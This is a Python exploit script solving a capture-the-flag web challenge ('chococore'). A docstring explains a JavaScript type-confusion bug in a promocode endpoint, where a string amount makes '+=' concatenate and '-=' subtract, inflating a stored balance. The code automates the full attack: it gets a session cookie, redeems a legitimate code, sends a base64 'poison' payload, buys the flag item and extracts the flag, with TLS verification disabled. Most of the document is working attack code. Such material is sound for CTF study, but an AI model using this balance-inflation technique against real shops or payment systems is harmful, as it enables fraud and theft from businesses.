#!/usr/bin/env python3
"""
chococore — exploit.

Root cause:
  src/app/api/promocode/route.ts has

      session.balance += promo.amount;
      try { ...validate... }
      catch { session.balance -= promo.amount; return error; }
      finally { updateSessionBalance(sessionId, session.balance); }

  When promo.amount is a STRING and session.balance is a non-zero number,
  the `+=` triggers JS string-concatenation while `-=` performs numeric
  subtraction.

  Example with balance = 5000 and amount = "1":
      session.balance += "1"   ->  "5000" + "1"   = "50001"  (string)
      session.balance -= "1"   ->  Number("50001") - Number("1") = 50000

  In general, an N-character numeric-string `amount` turns balance B into
      Number(str(B) + amount) - Number(amount)  ==  B * 10^N
  (because the `+` is string-concat).

  better-sqlite3 stores finite numbers verbatim, so the inflated balance
  survives the round-trip (unlike NaN, which becomes NULL).

Steps:
  1) Bootstrap session cookie via GET /api/session.
  2) Redeem TREAT5000 normally  -> balance = 5000.
  3) Send a "poison" promocode  {"amount":"1","coupon":"x"}  (base64-encoded).
     `+=` concatenates ("50001"), validation throws because typeof != number,
     `-=` numerically subtracts -> balance = 50000. The `finally` block
     persists 50000 to the DB.
  4) Add `flag` chocolate (price 31337) to cart with quantity 1.
  5) /api/checkout: 50000 >= 31337, order is placed.
  6) /api/completed: items contain {id:'flag', quantity:1} -> flag returned.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import ssl
import urllib.request
import urllib.error
import http.cookiejar

BASE = "https://chococore-h7arfq5w.alfactf.ru"
ART = Path(__file__).resolve().parent.parent / "artifacts"
ART.mkdir(parents=True, exist_ok=True)


def make_opener():
    cj = http.cookiejar.CookieJar()
    # ignore CA bundle issues — we just need to talk to the box
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    https = urllib.request.HTTPSHandler(context=ctx)
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), https), cj


def req(opener, method, path, body=None, headers=None):
    data = None
    h = {"Accept": "application/json", "User-Agent": "chococore-solver/2.0"}
    if body is not None:
        data = body.encode() if isinstance(body, str) else body
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    r = urllib.request.Request(f"{BASE}{path}", data=data, headers=h, method=method)
    try:
        with opener.open(r, timeout=20) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def main() -> int:
    opener, _cj = make_opener()

    # 1) bootstrap session cookie
    status, body = req(opener, "GET", "/api/session")
    print(f"[+] /api/session -> {status} {body[:200]}")
    (ART / "01_session.json").write_text(body)

    # 2) Legitimately redeem TREAT5000 -> balance = 5000.
    legit = b64('{"amount":5000,"coupon":"TREAT5000"}')
    status, body = req(
        opener, "POST", "/api/promocode", body=json.dumps({"code": legit})
    )
    print(f"[+] redeem TREAT5000 -> {status} {body[:200]}")
    (ART / "02_redeem.json").write_text(body)

    # 3) Poison: amount as string causes += to string-concat the balance.
    #    Balance 5000 + "1" -> "50001" -> -= "1" -> 50000 (number, persisted).
    poison = b64('{"amount":"1","coupon":"x"}')
    status, body = req(
        opener, "POST", "/api/promocode", body=json.dumps({"code": poison})
    )
    print(f"[+] poison (str amount) -> {status} {body[:200]}")
    (ART / "03_poison.json").write_text(body)

    # 4) Verify the inflated balance.
    status, body = req(opener, "GET", "/api/session")
    print(f"[+] session after poison -> {status} {body[:200]}")
    (ART / "04_session_after_poison.json").write_text(body)

    # 5) Add flag chocolate (id="flag", price=31337) to cart.
    status, body = req(
        opener,
        "POST",
        "/api/cart",
        body=json.dumps({"chocolateId": "flag", "quantity": 1}),
    )
    print(f"[+] add flag to cart -> {status} {body[:200]}")
    (ART / "05_cart.json").write_text(body)

    # 6) Checkout. Balance (50000) >= total (31337) -> success, order created.
    status, body = req(opener, "POST", "/api/checkout", body="{}")
    print(f"[+] checkout -> {status} {body[:200]}")
    (ART / "06_checkout.json").write_text(body)

    # 7) GET /api/completed: order contains flag item -> flag emitted.
    status, body = req(opener, "GET", "/api/completed")
    print(f"[+] /api/completed -> {status} {body[:600]}")
    (ART / "07_completed.json").write_text(body)

    # extract flag
    try:
        data = json.loads(body)
        msg = data.get("message", "")
        idx = msg.find("alfa{")
        if idx >= 0:
            end = msg.find("}", idx)
            print(f"\n[!!!] FLAG: {msg[idx:end + 1]}")
            return 0
    except Exception as e:
        print(f"json parse failed: {e}")

    print("[-] flag not found in completed response")
    return 1


if __name__ == "__main__":
    sys.exit(main())
